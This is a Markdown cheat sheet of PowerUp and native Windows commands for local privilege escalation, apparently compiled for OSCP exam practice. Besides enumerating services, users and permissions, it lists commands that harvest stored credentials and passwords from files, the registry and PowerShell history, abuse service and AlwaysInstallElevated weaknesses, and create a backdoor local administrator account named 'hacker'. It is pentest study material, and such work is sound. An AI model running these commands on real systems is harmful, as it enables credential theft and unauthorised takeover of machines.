# PowerUp

```
# Import PowerUp
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1

# Run All Checks
Invoke-AllChecks

# Find Modifiable Services
Get-ModifiableService

# Find Modifiable Service Files
Get-ModifiableServiceFile

# Find Unquoted Service Paths
Get-UnquotedService

# Find Services with Weak Permissions
Get-ServiceUnquoted
Get-ServiceFilePermission

# Find AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated

# Find AutoLogon Credentials
Get-RegistryAutoLogon

# Find Cached GPP Passwords
Get-CachedGPPPassword

# Find Stored Credentials
Get-StoredCredential

# Find Scheduled Tasks
Get-ModifiableScheduledTaskFile

# Find Registry Autoruns
Get-ModifiableRegistryAutoRun

# Find DLL Hijacking Opportunities
Find-PathDLLHijack

# Find Writable PATH Directories
Get-ModifiablePath

# Find Weak Folder Permissions
Get-ModifiableFile

# Find Weak Registry Permissions
Get-ModifiableRegistry

# Find User Home Shares
Find-UserField

# Find Interesting Files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue

# Check Current Privileges
whoami /priv

# Enumerate Environment Variables
Get-ChildItem Env:

# Check PowerShell History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Find Installed Software
Get-ChildItem "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
Get-WmiObject -Class Win32_Product

# Enumerate Running Services
Get-Service

# Enumerate Running Processes
Get-Process

# Enumerate Scheduled Tasks
schtasks /query /fo LIST /v

# Enumerate Startup Programs
Get-CimInstance Win32_StartupCommand

# Enumerate Local Users
Get-LocalUser
net user

# Enumerate Local Groups
Get-LocalGroup
net localgroup

# Enumerate Administrators
net localgroup Administrators

# Enumerate Network Shares
net share

# Enumerate Firewall Rules
netsh advfirewall firewall show rule name=all

# Enumerate Antivirus
Get-MpComputerStatus

# Enumerate Installed Hotfixes
Get-HotFix

# Find Writable Service Binary Paths
Get-WmiObject win32_service | Select Name,DisplayName,PathName,StartMode

# Abuse AlwaysInstallElevated
Write-UserAddMSI

# Abuse Service Binary Permissions
Install-ServiceBinary -Name 'ServiceName'

# Abuse Service Permissions
Write-ServiceBinary -Name 'ServiceName'

# Restart Service
Restart-Service ServiceName

# Create New Local Admin User
net user hacker Password123! /add
net localgroup administrators hacker /add

# Add Current User to Administrators
net localgroup administrators username /add

# Check UAC Status
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Find Writable Folders
accesschk.exe -uws "Everyone" C:\

# Search for Passwords
findstr /si password *.txt *.ini *.config *.xml

# Search Registry for Passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Enumerate Token Privileges
whoami /priv

# Enumerate Drivers
driverquery

# Enumerate Listening Ports
netstat -ano

# Enumerate SMB Shares
Get-SmbShare

# Enumerate Domain Information
nltest /domain_trusts
nltest /dclist:DOMAIN

# Enumerate Kerberos Tickets
klist

# Enumerate Logged-On Users
query user
quser

# Enumerate RDP Sessions
qwinsta

# Common OSCP Commands
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableService
Get-UnquotedService
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-CachedGPPPassword
Find-PathDLLHijack
Get-ModifiablePath
whoami /priv
net localgroup administrators
```
